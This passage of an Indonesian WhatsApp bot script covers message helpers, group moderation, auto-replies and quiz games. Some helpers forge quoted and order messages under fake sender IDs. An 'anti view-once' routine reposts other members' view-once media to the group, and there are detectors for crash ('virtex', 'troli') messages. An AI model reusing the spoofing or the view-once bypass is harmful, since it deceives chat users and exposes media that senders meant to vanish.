                                'productImageCount': '1'
                            },
                            'businessOwnerJid': `${nomerOwner}@s.whatsapp.net`        
                        }
                    }, {
                  contextInfo: forward,
                  quoted: ftoko
                    }), 
                  await xdev.relayWAMessage(res)         
                   }


//Troli menu
const sendTroli = async (deskripsi ) => {
                var sendnih = xdev.prepareMessageFromContent(from, {
                    'orderMessage': {
                        'orderId': '0@s.whatsapp.net',
                        'thumbnail': fs.readFileSync(`./stik/fake.jpeg`),
                        'itemCount': 10000901,
                        'status': 1,
                        'surface': 1,
                        'message': `*${fake}*`+ deskripsi,
                        'orderTitle': fake,
                        'sellerJid': `0@s.whatsapp.net`,
                      'token': 'notoken',
                    }
                }, {
                    'quoted': ftroli,
                    'contextInfo': forward,
                    'thumbnail' : fs.readFileSync('./stik/thumb.jpeg')
                });
                 xdev.relayWAMessage(sendnih)    
                }



//******************* 》FAKE MESSAGE《 ********************\\

      const sendAudio = (teks) => {
                    xdev.sendMessage(from, teks, audio, {thumbnail: fs.readFileSync('./stik/fake.jpeg'), mimetype: 'audio/mp4', quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "0@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : 2021,status: 1,surface : 2,message: `🆔「 ${pushname} 」\n🎵 ${responseButton}`,orderTitle: 'Bang',thumbnail: fs.readFileSync('./stik/fake2.jpeg'), sellerJid: '0@s.whatsapp.net'}}}, ptt: true, contextInfo: forward})
         } 
     const sendvn = (teks) => {
                    xdev.sendMessage(from, teks, audio, {mimetype: 'audio/mp4', thumbnail: fs.readFileSync('./stik/fake.jpeg'), quoted: dev, ptt: true})
         }     
     const reply = (teks) => {
                  xdev.sendMessage(from, teks, text, { thumbnail: fs.readFileSync('./stik/fake.jpeg'), quoted: dev });
      };
      const reply2 = (teks) => {
			xdev.sendMessage(from, teks, text, { thumbnail: fs.readFileSync('./stik/fake.jpeg'), detecLinks: false, quoted: dev, contextInfo: { forward, externalAdReply:{title: `${ucapanWaktu} kak`,body:`${week} ${calender}`,previewType:"PHOTO",thumbnail:thumb, sourceUrl:"https://youtu.be/_IlvsY7S7j8"}}})
		} 
        const sendMess = (teks) => {
            xdev.sendMessage(from, teks, text, {thumbnail: fs.readFileSync('./stik/fake.jpeg')})
        }
        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? xdev.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : xdev.sendMessage(from, teks.trim(), extendedText, { quoted: dev, contextInfo: { "mentionedJid": memberr, forwardingScore: totalForward, isForwarded: forwarding } })
        }
        const costum = (pesan, tipe, target, target2) => {
			xdev.sendMessage(from, pesan, tipe, { thumbnail: fs.readFileSync('./stik/fake.jpeg'), quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target2}` }},contextInfo: forward})
		}
		const sendSticker = (pesan) => {
			xdev.sendMessage(from, pesan, sticker, {quoted: dev, contextInfo: forward})
		}
		const sendSticker1 = (pesan) => {
			xdev.sendMessage(from, pesan, sticker)
		}
        const math = (teks) => {
				return Math.floor(teks)
		}  
        const fakethumb = (teks, yes) => {
            xdev.sendMessage(from, teks, image, {thumbnail: fakethumbnail, quoted:dev,caption:yes})
        }
        const fakestatus = (teks) => {
            xdev.sendMessage(from, teks, text, {quoted: ftext})
                
                }
                    
 
 
 

 
 
 
 
 
 
//******************* 》NO API《 ********************\\

        const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './stik' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './stik' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        xdev.sendMessage(to, media, sticker,{quoted:dev})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
				if(mids.length > 0){
					text = normalizeMention(to, text, mids)
				}
				const fn = Date.now() / 10000;
				const filename = fn.toString()
				let mime = ""
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						mime = res.headers['content-type']
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, filename, async function () {
					console.log('done');
					let media = fs.readFileSync(filename)
					let type = mime.split("/")[0]+"Message"
					if(mime === "image/gif"){
						type = MessageType.video
						mime = Mimetype.gif
					}
					if(mime.split("/")[0] === "audio"){
						mime = Mimetype.mp4Audio
					}
					xdev.sendMessage(to, media, type, { quoted: dev, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
					
					fs.unlinkSync(filename)
				});
			}
            
           const sendFileFromUrl = async(link, type, options) => {         
           hasil = await getBuffer(link)
	       xdev.sendMessage(from, hasil, type, options).catch(e => {
	       fetch(link).then((hasil) => {
	       xdev.sendMessage(from, hasil, type, options).catch(e => {
	       xdev.sendMessage(from, { url : link }, type, options).catch(e => {
	       reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_')
	
	       console.log(e)
})
})
})
})
}
const sendWebp = async(to, url) => {
           var names = Date.now() / 10000;
           var download = function (uri, filename, callback) {
           request.head(uri, function (err, res, body) {
           request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
}
const sendFile = async(link, type, options) => {
hasil = await getBuffer(link)
xdev.sendMessage(from, hasil, type, options).catch(e => {
fetch(link).then((hasil) => {
xdev.sendMessage(from, hasil, type, options).catch(e => {
xdev.sendMessage(from, { url : link }, type, options).catch(e => {
reply2('Error!')
console.log(e)
})
})
})
})
}            
   

const sendStickerUrl = async(to, url) => {
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker...'))
				var names = getRandom('.webp')
				var namea = getRandom('.png')
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, namea, async function () {
					let filess = namea
					let asw = names
					require('./lib/exif.js')
					exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
					exec(`webpmux -set exif ./sticker/data.exif ${asw} -o ${asw}`, async (error) => {
					let media = fs.readFileSync(asw)
					xdev.sendMessage(to, media, sticker, dev)
					console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker...'))
					fs.unlinkSync(names)
					fs.unlinkSync(namea)
					});
					});
				});
			}
         

//CMD BUTTON FUNCTION
        selectedButton = (type == 'buttonsResponseMessage') ? dev.message.buttonsResponseMessage.selectedButtonId : ''
        responseButton = (type == 'listResponseMessage') ? dev.message.listResponseMessage.title : ''
        
            
            
            
                    
            
            
//******************* 》SECURITY《 ********************\\
            
//ANTI VIO 
      if (!dev.key.fromMe && isGroup && isAntiviewonce && m.mtype == "viewOnceMessage") {       	
      reply(`@${sender.split("@")[0]} Terdeteksi mengirim gambar/video viewonce!`);
      var msg = { ...dev };
      msg.dev = dev.message.viewOnceMessage.message;
      msg.dev[Object.keys(msg.dev)[0]].viewOnce = false;
      xdev.copyNForward(m.chat, msg);
      }
 




  
//ANTI HIDETAGG
       if (isGroup && isAntihidetag && m.message[m.mtype]?.contextInfo?.mentionedJid?.length == groupMembers.length) {    
       if (isGroupAdmins) return reply('Admin bebas pakai hidetag dong :v')
       console.log( color("[ANTI-HIDETAG]", "red"), color(`@${sender.split("@")[0]} mengirim pesan hidetag`, "cyan") );
       reply(`Maaf, Botz akan mengeluarkan kamu karena kamu terdetaksi mengirim pesan hidetag`);
       setTimeout(() => {
       xdev.groupRemove(from, [sender]);
       },3000)
       }
       
     

 

//ANTI TROLI 
if (m.message  && !m.key.fromMe && m.isBaileys && m.quoted && m.quoted.mtype === 'orderMessage' && !(m.quoted.token && m.quoted.orderId)) {
if (antibugtroli === false) return
if(jeda === true) return
 jeda = true
m.reply('Troli Detected\n\n' + require('util').format(m.key))
await xdev.modifyChat(m.chat, 'delete', {
 includeStarred: false
})
setTimeout( () => {
jeda = false
},2000)
}

    


//ANTI BADWORD 
          if (isGroup && Toxic && !isOwner && !isGroupAdmins && !dev.key.fromMe){ 
          if (badword.includes(messagesC)) {
          if (isCountKasar(sender, senbadword)){
          if (!isBotGroupAdmins) return reply(`Kamu beruntung karena bot bukan admin`)
          reply(`*「 ANTI BADWORD 」*\n\nSepertinya kamu sudah berkata kasar lebih dari 5x, maaf kamu akan di kick`)
          setTimeout( () => {
          xdev.groupRemove(from, [sender])
          },1000)
          delCountKasar(sender, senbadword)
           } else {
          addCountKasar(sender, senbadword)
          reply(`Kamu terdeteksi berkata kasar\nJangan ulangi lagi atau kamu akan dikick oleh botz`)
           }
           }
           }
           
           

		
			
//ANTI VIRUS
    if (isGroup && AntiVirtex && budy.length > 20000) {
    if (isGroupAdmins) return reply('*VIRTEX DETECTED*')
    console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
    await xdev.modifyChat(m.chat, 'delete', { includeStarred: false })
    await xdev.sendMessage(from, antivirus(pushname,groupName), text)
    if (!isBotGroupAdmins) return 
    if(isOwner) return 
    await xdev.groupRemove(from, [sender])
    await xdev.groupSettingChange(from, GroupSettingChange.messageSend, true)
    await sendMess("Group Telah Di Tutup")
    await sendMess(`${nomerOwner}@s.whatsapp.net`, `Hai Owner! wa.me/${sender.split("@")[0]} Terdeteksi Telah Mengirim Virtex ${isGroup?`di Group ${groupName}`:''}`, text)
    }
    
 //ANTI LINK GROUP
				if (isGroup && isAntilinkGc && budy.includes(`chat.whatsapp.com`)) {
				if (isGroupAdmins) return reply('Alah sia admin grup mah bebas yekan :v')
				linkgc = await xdev.groupInviteCode(from)
				if (budy.includes(`${linkgc}`)) return reply ('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
				if (budy.includes('zinadmin')) return reply('izinadmin diterima')
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply(` *「 LINK GROUP DETECTED 」*\nKamu mengirimkan link group, maaf kamu di kick dari grup :(`)
				setTimeout(() => {
				xdev.groupRemove(from, [kic]).catch((e) => { reply(`BOT HARUS JADI ADMIN`) })
				}, 2000)
			    }   

 //ANTI LINK 
				if (isGroup && isAntiLink){
                if (budy.includes(`https:`)) { 
				if (isGroupAdmins) return reply('Alah sia admin grup mah bebas yekan :v')
				linkgc = await xdev.groupInviteCode(from)
				if (budy.includes(`${linkgc}`)) return reply ('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
				if (budy.includes('zinadmin')) return reply('izinadmin diterima')
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply(` *「 LINK DETECTED 」*\nKamu mengirimkan link, maaf kamu di kick dari grup :(`)
				setTimeout(() => {
				xdev.groupRemove(from, [kic]).catch((e) => { reply(`BOT HARUS JADI ADMIN`) })
				}, 2000)
			    }
			    }



//******************* 》FUNCTION PUBLIC《 ********************\\

// MUTE
if (isMuted ){
            if (!isOwner && !theOwner) return
}

 //BAN CHAT
if (isBanchat){
if (!isOwner && !theOwner && !isGroupAdmins) return
}




   
//******************* 》FUNCTION OTHERS《 ********************\\
    
    
    


    
//AFK FUNCTION
            cekafk(afk)
            if (!dev.key.remoteJid.endsWith('@g.us') && offline){
            if (!dev.key.fromMe){
            if (isAfk(dev.key.remoteJid)) return
            addafk(dev.key.remoteJid)
            heheh = ms(Date.now() - waktu) 
            xdev.sendMessage(dev.key.remoteJid,`@${nomerOwner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${nomerOwner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}})
            }
            }   
        if (dev.key.remoteJid.endsWith('@g.us') && offline) {
        if (!dev.key.fromMe){
        if (dev.message.extendedTextMessage != undefined){
        if (dev.message.extendedTextMessage.contextInfo != undefined){
        if (dev.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
        for (let ment of dev.message.extendedTextMessage.contextInfo.mentionedJid) {
        if (ment === `${nomerOwner}@s.whatsapp.net`){
        if (isAfk(dev.key.remoteJid)) return
        addafk(dev.key.remoteJid)
        heheh = ms(Date.now() - waktu)
        xdev.sendMessage(dev.key.remoteJid,`@${nomerOwner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${nomerOwner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}})
          }
        }
            }
          }
        }
      }
    }
  
 

        






//BOT FUNCTION
const oawalah =['iya kak ?','Ada apa kak ?','Bot aktif kak','Aku bukan bot kak, aku ini hooman','Kumaha atuh kak ?','Kunaon kak ?','oy ?','ya ?','Kenapa panggil aku','Ada apa kak kok panggil aku']
const hayuk = oawalah[Math.floor(Math.random() * oawalah.length)]
       
       


  
//VOTING FUNCTION 
	    if(isGroup && !isVote) {
        if (budy.toLowerCase() === 'vote'){
        let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
        let fil = vote.map(v => v.participant)
        let id_vote = sender ? sender : '6285751056816@s.whatsapp.net'
        if(fil.includes(id_vote)) {
        return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
        } else {
        vote.push({
            participant: id_vote,
            voting: '✅'
        })
        fs.writeFileSync(`./lib/${from}.json`,JSON.stringify(vote))
        let _p = []
        let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n` 
        for(let i = 0; i < vote.length; i++) {
        _vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
        _p.push(vote[i].participant)
        }  
        _p.push(_votes[0].votes)
        mentions(_vote,_p,true)   
        }
        } else if (budy.toLowerCase() === 'devote'){
        const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
        let fil = vote.map(v => v.participant)
        let id_vote = sender ? sender : '6285751056816@s.whatsapp.net'
        if(fil.includes(id_vote)) {
        return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
        } else {
        vote.push({
            participant: id_vote,
            voting: '❌'
        })
        fs.writeFileSync(`./lib/${from}.json`,JSON.stringify(vote))
        let _p = []
        let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n` 
        for(let i = 0; i < vote.length; i++) {
        _vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
        _p.push(vote[i].participant)
        }  
        _p.push(_votes[0].votes)
        mentions(_vote,_p,true)   
        }
    }
}	
   

 
 

//PUBLIC
if (publik === false) {
if (!dev.key.fromMe && !isOwner && !theOwner) return
		}


if(isBanned && !isOwner) return
if(isSpamBan) return
SpamExpired(spamBan)
SpammerExpired(spamkuyy)

       
            
//ANTI SPAM
        if (isCmd && msgFilter.isFiltered(from) && !isGroup && !dev.key.fromMe) {
        if(cekSpam(sender, spamBan)) return
        console.log(color('[SPAM]', 'red'), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`), 'dari', color(pushname))
        addSpam(sender, "30s", spamBan)
        console.log(color('[SPAM]', 'red'), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`Berhasil banned ${pushname} sementara`))
        if(autovn) return sendvn(nospam)
        return reply(textspam)
		}
        
        if (isCmd && msgFilter.isFiltered(from) && isGroup && !dev.key.fromMe) {
        if(cekSpam(sender, spamBan)) return
        console.log(color('[SPAM]', 'red'), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
        addSpam(sender, "30s", spamBan)
        console.log(color('[SPAM]', 'red'), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`Berhasil banned user sementara`), 'from', color(pushname))
        if(autovn) return sendvn(nospam)
        return reply(textspam)
		}
       if (isCmd && !isOwner) msgFilter.addFilter(from)

    
    
    
    
 
    
 
    
    
    
//******************* 》AUTO SYSTEM《 ********************\\

//AUTO BIO
    ron = process.uptime() 
    teks = `${kyun(ron)}`
    if(autobio){
    await xdev.setStatus(`${fake} Aktif Selama: ${teks} | Baterai: ${baterai.battery}`)
    }
//AUTO REGISTER
    if (!isUser && isCmd && !isOwner && !dev.key.fromMe){ 
    user.push(sender)
    fs.writeFileSync('./database/user.json', JSON.stringify(user))
    }
//AUTO READ   
     if(autoread){
     await xdev.chatRead(from, "read")
      }
      
 //Auto Hit
    if(command){
    hitnya.push(command)
    fs.writeFileSync('./database/hitToday.json', JSON.stringify(hitnya))
    }

        
//AUTO TYPING & RECORDING
    if (isCmd && autovn){
    await xdev.updatePresence(from, Presence.recording)
    } else if (isCmd && typing){
    await xdev.updatePresence(from, Presence.composing)
    } else {
    await xdev.updatePresence(from, Presence.avaible)
    }

  //AUTO BLOCK CMD
    for (let i = 0; i < listcmdblock.length ; i++) {
    if (command.startsWith(listcmdblock[i].cmd)){
    if(autoblockcmd) return reply("Maaf kak command tersebut telah di block oleh system karena terjadi error")
    return reply(`Maaf kak command tersebut telah di block oleh owner`)
    }
    }

//AUTO RESPON
      for (let i = 0; i < commandsDB.length ; i++) {
      if (budy == commandsDB[i].pesan) {
      xdev.sendMessage(from, commandsDB[i].balasan, text, {quoted: dev})
      }
      }
    
 
//AUTO RESPON SIMI BY DECODE DENPA 
       if (chatBot === false && autorespon === true && !isGroup && !isCmd && !command && !dev.key.fromMe) { 
	   simi = await fetchJson(`https://api.simsimi.net/v2/?text=${cmd}&lc=id`)
       sami = simi.success
       xdev.sendMessage(from, `${sami}`, text, {thumbnail : fakethumbnail, quoted: { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${fake}`,"title": `Hmm`,'jpegThumbnail': thumb}}}})
       } 
         
  
    
//AUTO RESPON STICKER
    if (autovn && setiker.includes(messagesC)){
    if(isExtream) return
	namastc = messagesC
	buffer = fs.readFileSync(`./temp/stick/${namastc}.webp`)
	xdev.sendMessage(from, buffer, sticker, {quoted:dev })
	}
	
//AUTO RESPON VN
	for (let anju of audionye){
	if (budy === anju){
	if (isSpammerr) return sendSticker(spam2)
	buffer = fs.readFileSync(`./temp/audio/${anju}.mp3`)
	xdev.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${pushname} \n「 audio 」 ${anju}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./stik/fake1.jpeg')}}}, ptt: true, contextInfo: forward})
    addSpammer(sender, "10s", spamkuyy)
	}
	}
	
//AUTO RESPON MUSIK
	for (let anjir of musiknye){
	if (budy === anjir || responseButton === anjir ){
	reply("*Loading...*")
	buffer = fs.readFileSync(`./temp/musik/${anjir}.mp3`)
	xdev.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "0@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : 2021,status: 1,surface : 2,message: `🆔「 ${pushname} 」\n🎵 ${anjir}`,orderTitle: 'Bang',thumbnail: fs.readFileSync('./stik/fake2.jpeg'), sellerJid: '0@s.whatsapp.net'}}}, ptt: true, contextInfo: forward})
	}
	}
	
//AUTO RESPON IMAGE
	if (imagenye.includes(messagesC)){
	namastc = messagesC
	buffer = fs.readFileSync(`./temp/foto/${namastc}.jpeg`)
	xdev.sendMessage(from, buffer, image, {quoted : dev})
	}

//AUTO RESPON VIDEO
	if (videonye.includes(messagesC)){
	namastc = messagesC
	buffer = fs.readFileSync(`./temp/video/${namastc}.mp4`)
	xdev.sendMessage(from, buffer, video, {quoted : dev})
	}
	
	
    
 //AKSES PRIVATE 
  if (!isGroup && !isOwner && !isPremium && isCmd && chatBot === true) {
  if(autovn) return sendvn(gakmau)
  return reply(teksChat)
  }

 

	
//========================================================================================================================//
		colors = ['red','white','black','blue','yellow','green','magenta','cyan','pink','gold','purple','navy','gray']
		            const isImage = (type === 'imageMessage')
					const isVideo = (type === 'videoMessage')
					const isSticker = (type == 'stickerMessage')
					const isAudio = (type == 'audioMessage')
					const isMedia = (type === 'imageMessage' || type === 'videoMessage')
					const isViewOnce = (type == 'viewOnceMessage')
					const isAllMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'stickerMessage' || type === 'audioMessage' || type === 'contactMessage' || type === 'locationMessage')
					const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
					const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
					const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
					const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
					const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
					const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
					const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
					const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
					const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
					const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
					const isQuotedextendedText = type === 'extendedTextMessage' && content.includes('extendedTextMessage')
					
					


		    if (!isGroup && !isCmd ) console.log(color("[PRIVATE]", "greenyellow"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(budy, "cyan"), color('dari', 'gold'), color(`${pushname}`, 'orange'))
            if (isGroup && !isCmd ) console.log(color("[GRUP]", "gold"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(budy, "cyan"), color('dari', 'gold'), color(`${pushname}`, 'orange'), color('di gc', 'purple'), color(groupName, "deeppink"))
            if (!isGroup && isCmd ) console.log(color("[CMD]", "blue"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`, 'cyan'), color('dari', 'gold'), color(`${pushname}`, 'orange'))
            if (isGroup && isCmd ) console.log(color("[CMD]", "blue"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`, 'cyan'), color('dari', 'gold'), color(`${pushname}`, 'orange'), color('di gc', 'purple'), color(groupName, "deeppink"))
			
		
		

_sewa.expiredCheck(xdev, sewa)
_prem.expiredCheck(premium)

      function clockString(ms) {
      let h = isNaN(ms) ? "--" : Math.floor(ms / 3600000);
      let m = isNaN(ms) ? "--" : Math.floor(ms / 60000) % 60;
      let s = isNaN(ms) ? "--" : Math.floor(ms / 1000) % 60;
      return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
    }
	
	
 game.cekWaktuTK(xdev, tebakkata)
 game.cekWaktuFam(xdev, family100)
 game.cekWaktuTG(xdev, tebakgambar)
 game.cekWaktuMtk(xdev, mtk) 
 game.cekWaktuTB(xdev, tebakbendera)
 game.cekWaktuTA(xdev, tebakanime)
 game.cekWaktuSA(xdev, siapaaku)
 game.cekWaktuTL(xdev, tebaklirik)
 game.cekWaktuCkl(xdev, caklontong)
 
 
 
if (game.isCkl(from, caklontong)){
if (chatss.toLowerCase().includes(game.getJawabanCkl(from, caklontong))){
var htgtk = randomNomor(100)
addBalance(sender, htgtk, balance)
await reply(`*GAME CAK LONTONG*
Selamat jawaban kamu benar\nJawaban : ${game.getJawabanCkl(from, caklontong)}\n*Hadiah : $${htgtk}
Ingin bermain lagi? kirim ${prefix}caklontong`)
caklontong.splice(game.getCklPosi(from, caklontong), 1)
}else if(type === 'conversation' && !command && !dev.key.fromMe){
	reply(jawabansalah)
	}
}
 
 
if (game.isTebakKata(from, tebakkata)){
if (chatss.toLowerCase().includes(game.getJawabanTK(from, tebakkata))){
var htgtk = randomNomor(100)
addBalance(sender, htgtk, balance)
await reply(`*GAME TEBAK KATA*
Selamat jawaban kamu benar\nJawaban : ${game.getJawabanTK(from, tebakkata)}\n*Hadiah : $${htgtk}
Ingin bermain lagi? kirim ${prefix}tebakkata`)
tebakkata.splice(game.getTKPosi(from, tebakkata), 1)
}else if(type === 'conversation' && !command && !dev.key.fromMe){
	reply(jawabansalah)
	}
}
 
 if (game.isTebakGambar(from, tebakgambar)){
if (chatss.toLowerCase().includes(game.getJawabanTG(from, tebakgambar))){
var htgm = randomNomor(100)
addBalance(sender, htgm, balance)
await reply(`*Selamat jawaban kamu benar*\nJawaban : ${game.getJawabanTG(from, tebakgambar)}\nHadiah : $${htgm}\n\nIngin bermain lagi? kirim ${prefix}tebakgambar`)
tebakgambar.splice(game.getTGPosi(from, tebakgambar), 1)
} else if(type === 'conversation' && !command && !dev.key.fromMe){
	reply(jawabansalah)
	}
}
if (game.isMtk(from, mtk)){
if (chatss.toLowerCase().includes(game.getJawabanMtk(from, mtk))){
var htgm3 = randomNomor(1000)
addBalance(sender, htgm3, balance)
await reply(`*Selamat jawaban kamu benar*\nJawaban : ${game.getJawabanMtk(from, mtk)}\n*Hadiah : $${htgm3}\n\nIngin bermain lagi? kirim ${prefix}math`)
mtk.splice(game.getMtkPosi(from, mtk), 1)
}else if(type === 'conversation' && !command && !dev.key.fromMe){
	reply(jawabansalah)
	}
}    
if (game.isfam(from, family100)){
var anjuy = game.getjawaban100(from, family100)
for (let i of anjuy){
if (chatss.toLowerCase().includes(i)){
var htgm1 = randomNomor(1000)
addBalance(sender, htgm1 , balance)
await reply(`Jawaban benar\nJawaban : ${i}\nHadiah : $${htgm1}\n\nJawaban yang blum tertebak : ${anjuy.length - 1}`)
var anug = anjuy.indexOf(i)
anjuy.splice(anug, 1)
} 
}
if (anjuy.length < 1){
xdev.sendMessage(from, `Semua jawaban sudah tertebak\nKirim ${prefix}family100 untuk bermain lagi`, text)
family100.splice(game.getfamposi(from, family100), 1)
}
}   
if (game.isTebakBendera(from, tebakbendera)){
if (chatss.toLowerCase().includes(game.getJawabanTB(from, tebakbendera))){
var syahira = randomNomor(100)
addBalance(sender, syahira, balance)
await reply(`*GAME TEBAK BENDERA*
Selamat jawaban kamu benar\nJawaban : ${game.getJawabanTB(from, tebakbendera)}\nHadiah : $${syahira}
Ingin bermain lagi? kirim ${prefix}tebakbendera`)
tebakbendera.splice(game.getTBPosi(from, tebakbendera), 1)
} else if(type === 'conversation' && !command && !dev.key.fromMe){
	reply(jawabansalah)
	}
}
if (game.isTebakAnime(from, tebakanime)){
if (chatss.toLowerCase().includes(game.getJawabanTA(from, tebakanime))){
var vinna = randomNomor(100)
addBalance(sender, vinna, balance)
await reply(`*GAME TEBAK ANIME*
Selamat jawaban kamu benar\nJawaban : ${game.getJawabanTA(from, tebakanime)}\nHadiah : $${vinna}
Ingin bermain lagi? kirim ${prefix}tebakanime`)
tebakanime.splice(game.getTAPosi(from, tebakanime), 1)
}else if(type === 'conversation' && !command && !dev.key.fromMe){
	reply(jawabansalah)
	}
} 	        

if (game.isTebakLirik(from, tebaklirik)){
if (chatss.toLowerCase().includes(game.getJawabanTL(from, tebaklirik))){
var htgml = randomNomor(100)
addBalance(sender, htgml, balance)
await reply(`*GAME TEBAK LIRIK*
Selamat jawaban kamu benar\nJawaban : ${game.getJawabanTL(from, tebaklirik)}\nHadiah : $${htgml}
Ingin bermain lagi? kirim ${prefix}tebaklirik`)
tebaklirik.splice(game.getTLPosi(from, tebaklirik), 1)
}else if(type === 'conversation' && !command && !dev.key.fromMe){
	reply(jawabansalah)
	}
} 
if (game.isSiapaAku(from, siapaaku)){
if (chatss.toLowerCase().includes(game.getJawabanSA(from, siapaaku))){
var htgmu = randomNomor(100)
addBalance(sender, htgmu, balance)
await reply(`*GAME SIAPAKAH AKU*
Selamat jawaban kamu benar\nJawaban : ${game.getJawabanSA(from, siapaaku)}\nHadiah : $${htgmu}
Ingin bermain lagi? kirim ${prefix}siapakahaku`)
siapaaku.splice(game.getSAPosi(from, siapaaku), 1)
}else if(type === 'conversation' && !command && !dev.key.fromMe){
	reply(jawabansalah)
	}
}





   
    function addMetadata(packname, author) {	
				if (!packname) packname = 'Extream'; if (!author) author = 'Botz';	
				author = author.replace(/[^a-zA-Z0-9]/g, '');	
				let name = `${author}_${packname}`
				if (fs.existsSync(`./stickers/${name}.exif`)) return `./stickers/${name}.exif`
				const json = {	
